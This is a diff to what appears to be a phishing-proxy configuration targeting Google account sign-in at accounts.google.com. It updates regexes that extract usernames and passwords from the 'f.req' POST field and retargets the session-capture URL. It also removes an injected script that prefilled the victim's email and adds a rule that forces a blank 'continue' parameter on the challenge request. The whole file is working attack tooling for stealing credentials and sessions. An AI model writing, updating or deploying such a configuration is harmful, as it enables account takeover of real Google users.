@@ -32,7 +32,7 @@ auth_tokens:
 credentials:
   username:
     key: 'f.req'
-    search: '\],"([^"]*)"\]$'
+    search: '\[\]\]\,\"([^"]*)\"\,'
     type: 'post'
   password:
     key: 'f.req'
@@ -40,36 +40,18 @@ credentials:
     type: 'post'
 
 auth_urls:
-  - '/CheckCookie'
+  - '/v3/signin/challenge'
   - '/_/AccountSettingsUi/browserinfo'
 
-landing_path:
-  - '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
 login:
-    domain: 'accounts.google.com'
-    #path: '/ServiceLogin'
-    path: '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
-js_inject:  
-  - trigger_domains: ["accounts.google.com"]
-    trigger_paths: ["/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin"]
-    trigger_params: ["email"]
-    script: |
-      function lp(){
-        var email = document.querySelector("#Email");
-        if (email != null) {
-          email.value = "{email}";
-          return;
-        }
-        setTimeout(function(){lp();}, 100);
-      }
-      setTimeout(function(){lp();}, 100);
-      function serialize( obj ){
-        var str = [];
-        for (var p in obj){
-          if (obj.hasOwnProperty(p)) {
-            str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
-          }
-        }
-        return str.join("&");
-      }
-         
+  domain: 'accounts.google.com'
+  path: '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+force_post:
+  - path: '/v3/signin/challenge'
+    search:
+      - {key: 'f.req', search: '.*'}
+      - {key: 'continue', search: '.*'}
+    force:
+      - {key: 'continue', value: ''}
+    type: 'post'
